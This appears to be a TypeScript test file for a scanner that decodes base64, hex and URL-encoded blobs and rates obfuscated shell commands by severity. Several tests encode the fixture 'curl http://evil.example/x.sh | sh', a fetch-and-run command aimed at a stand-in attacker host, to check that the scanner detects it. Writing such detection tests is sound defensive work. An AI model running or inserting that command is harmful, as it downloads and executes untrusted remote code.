import { test } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { findDecodedBlobs } from "./encoding.ts";

test("base64 blob is decoded and reported as info only", () => {
  const { decoded, findings } = findDecodedBlobs("run: aGVsbG8sIHdvcmxkIQ==");
  assert.equal(decoded.length, 1);
  assert.equal(decoded[0].from, "base64");
  assert.equal(decoded[0].text, "hello, world!");
  const info = findings.find((f) => f.id === "obf-base64");
  assert.ok(info);
  assert.equal(info!.severity, "info");
  assert.ok(!findings.some((f) => f.id === "obf-base64-cmd"));
});

test("base64 with a shell command -> medium obf-base64-cmd", () => {
  const b64 = Buffer.from("curl http://evil.example/x.sh").toString("base64");
  const { findings } = findDecodedBlobs(`payload ${b64}`);
  const cmd = findings.find((f) => f.id === "obf-base64-cmd");
  assert.ok(cmd);
  assert.equal(cmd!.severity, "medium");
  assert.notEqual(cmd!.terminal, true);
});

test("base64 with pipe execution -> high + terminal", () => {
  const b64 = Buffer.from("curl http://evil.example/x.sh | sh").toString("base64");
  const { findings } = findDecodedBlobs(`payload ${b64}`);
  const cmd = findings.find((f) => f.id === "obf-base64-cmd");
  assert.ok(cmd);
  assert.equal(cmd!.severity, "high");
  assert.equal(cmd!.terminal, true);
});

test("random alphanumeric text is not a false base64 hit", () => {
  const { decoded } = findDecodedBlobs("thequickbrownfoxjumpsoverthelazydog");
  assert.equal(decoded.length, 0);
});

test("hex \\xNN escapes are decoded", () => {
  const { decoded } = findDecodedBlobs("says \\x68\\x65\\x6c\\x6c\\x6f");
  assert.equal(decoded.length, 1);
  assert.equal(decoded[0].from, "hex-escapes");
  assert.equal(decoded[0].text, "hello");
});

test("long hex string is decoded; a git sha is not", () => {
  const { decoded } = findDecodedBlobs("hash 68656c6c6f20776f726c64 end");
  assert.equal(decoded.length, 1);
  assert.equal(decoded[0].from, "hex");
  assert.equal(decoded[0].text, "hello world");
  const sha = findDecodedBlobs("commit 9d2741b0c8c3f1a2b3c4d5e6f7a8b9c0d1e2f3a4");
  assert.equal(sha.decoded.length, 0);
});

test("URL-encoding (>= 4 units) is decoded", () => {
  const { decoded } = findDecodedBlobs("q=%68%65%6c%6c%6f");
  assert.equal(decoded.length, 1);
  assert.equal(decoded[0].from, "url-encoding");
  assert.equal(decoded[0].text, "hello");
});

test("nested base64 is decoded recursively (depth 2)", () => {
  const inner = Buffer.from("curl http://evil.example/x.sh | sh").toString("base64");
  const outer = Buffer.from(`payload ${inner}`).toString("base64");
  const { decoded, findings } = findDecodedBlobs(outer);
  assert.equal(decoded.length, 2);
  assert.equal(decoded[1].from, "base64>base64");
  assert.equal(decoded[1].text, "curl http://evil.example/x.sh | sh");
  assert.ok(findings.some((f) => f.id === "obf-base64-cmd" && f.terminal === true));
});

test("recursion depth is bounded (no infinite loop)", () => {
  const b64 = Buffer.from("abc").toString("base64"); // 8 chars, below threshold
  const text = Buffer.from(`x ${b64}`).toString("base64");
  const { decoded } = findDecodedBlobs(text);
  assert.ok(decoded.length <= 2);
});

test("original input is never mutated", () => {
  const raw = "b64: aGVsbG8sIHdvcmxkIQ==";
  const before = raw.slice();
  findDecodedBlobs(raw);
  assert.equal(raw, before);
});

test("decoded blob carries the file line of its start", () => {
  const { decoded } = findDecodedBlobs("first line\nsecond aGVsbG8sIHdvcmxkIQ==");
  assert.equal(decoded[0].line, 2);
});
